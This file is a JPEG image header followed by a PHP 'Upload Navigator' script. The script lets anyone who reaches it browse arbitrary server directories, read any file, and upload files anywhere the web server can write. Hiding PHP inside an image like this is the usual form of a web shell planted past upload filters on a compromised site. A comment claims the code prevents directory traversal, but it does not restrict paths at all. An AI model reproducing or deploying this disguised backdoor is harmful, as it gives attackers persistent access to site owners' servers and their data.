ÿØÿà JFIF  H H  ÿâØICC_PROFILE   È    0  mntrRGB XYZ à        acsp                             öÖ     Ó-                                                   	desc   ð   $rXYZ     gXYZ  (   bXYZ  <   wtpt  P   rTRC  d   (gTRC  d   (bTRC  d   (cprt  Œ   <mluc          enUS       s R G BXYZ       o¢  8õ  XYZ       b™  ·…  ÚXYZ       $   „  ¶ÏXYZ       öÖ     Ó-para        ff  ò§  
Y  Ð  
[        mluc          enUS        G o o g l e   I n c .   2 0 1 6ÿÛ C 		

	

<?php
// PHP Upload Center with Navigation (60 lines)
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$msg = '';
$uploaded_file_url = '';

// Security: Prevent directory traversal
$current_dir = realpath($current_dir) ?: getcwd();

// Get the web accessible path (relative to document root)
$doc_root = $_SERVER['DOCUMENT_ROOT'];
$web_path = str_replace($doc_root, '', $current_dir);
$web_path = ltrim($web_path, '/');

// Handle upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = basename($file['name']);
    $target = $current_dir . '/' . $filename;
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        $msg = "✓ File uploaded successfully!";
        // Create web URL for the uploaded file
        $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
        $host = $_SERVER['HTTP_HOST'];
        $web_url = $protocol . $host . '/' . $web_path . '/' . $filename;
        $web_url = str_replace('//', '/', $web_url); // Fix any double slashes
    } else {
        $msg = "✗ Upload failed";
    }
}

// Handle file opening
if (isset($_GET['open'])) {
    $file_to_open = $current_dir . '/' . basename($_GET['open']);
    if (file_exists($file_to_open) && is_file($file_to_open)) {
        header('Content-Type: ' . mime_content_type($file_to_open));
        header('Content-Disposition: inline; filename="' . basename($file_to_open) . '"');
        readfile($file_to_open);
        exit;
    }
}

// Get folders and files
$items = scandir($current_dir);
$folders = $files = [];
foreach ($items as $item) {
    if ($item !== '.' && $item !== '..') {
        $path = $current_dir . '/' . $item;
        is_dir($path) ? $folders[] = $item : $files[] = $item;
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>Upload Navigator</title><style>
body{font-family:monospace;margin:20px}
.path{background:#eee;padding:10px}
.folder{color:blue;cursor:pointer}
.folder:hover{text-decoration:underline}
form{border:2px dashed #aaa;padding:20px;margin:20px 0}
input,button{padding:10px;margin:5px}
.msg{padding:10px;background:#eef}
.file-link{display:inline-block;margin-top:15px;padding:15px;background:#eef;border-radius:5px;border-left:4px solid green}
.file-link a{color:green;font-weight:bold;text-decoration:none;font-size:16px}
.file-link a:hover{text-decoration:underline}
.file-item{cursor:pointer;color:#0066cc}
.file-item:hover{text-decoration:underline}
.url-box{background:#fff;padding:10px;margin-top:10px;border:1px solid #ddd;word-break:break-all}
.copy-btn{background:#4CAF50;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;margin-left:10px}
.copy-btn:hover{background:#45a049}
</style></head>
<body>
<h1>📁 Upload Navigator</h1>

<div class="path">
    <strong>Current Location:</strong> <?=htmlspecialchars($current_dir)?>
    <br><small>📎 Web Path: /<?=htmlspecialchars($web_path)?></small>
    <br><small>Click folders to navigate | Click files to open</small>
</div>

<?php if($msg):?>
    <div class="msg">
        <?=$msg?>
        <?php if(isset($web_url)):?>
            <div class="file-link">
                <strong>🔗 File URL:</strong><br>
                <div class="url-box">
                    <a href="<?=$web_url?>" target="_blank"><?=$web_url?></a>
                    <button class="copy-btn" onclick="copyToClipboard('<?=$web_url?>')">Copy</button>
                </div>
                <small>✨ Click the link to open file in browser</small>
            </div>
        <?php endif;?>
    </div>
<?php endif;?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload Here</button>
</form>

<h3>📂 Folders:</h3>
<ul>
    <li class="folder" onclick="navigate('..')">⬆ Parent Folder</li>
    <?php foreach($folders as $f):?>
        <li class="folder" onclick="navigate('<?=htmlspecialchars($f)?>')">📁 <?=htmlspecialchars($f)?></li>
    <?php endforeach;?>
</ul>

<h3>📄 Files:</h3>
<ul><?php foreach($files as $f):
    // Generate web URL for each file
    $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'];
    $file_url = $protocol . $host . '/' . $web_path . '/' . $f;
    $file_url = str_replace('//', '/', $file_url);
?>
    <li class="file-item" onclick="openFile('<?=htmlspecialchars($f)?>')" title="<?=$file_url?>">
        📄 <?=htmlspecialchars($f)?>
    </li>
<?php endforeach;?></ul>

<script>
function navigate(folder) {
    window.location.href = '?dir=<?=urlencode($current_dir)?>/' + encodeURIComponent(folder);
}

function openFile(file) {
    window.location.href = '?dir=<?=urlencode($current_dir)?>&open=' + encodeURIComponent(file);
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        alert('URL copied to clipboard!');
    }, function(err) {
        console.error('Could not copy text: ', err);
    });
}
</script>
</body>
</html>
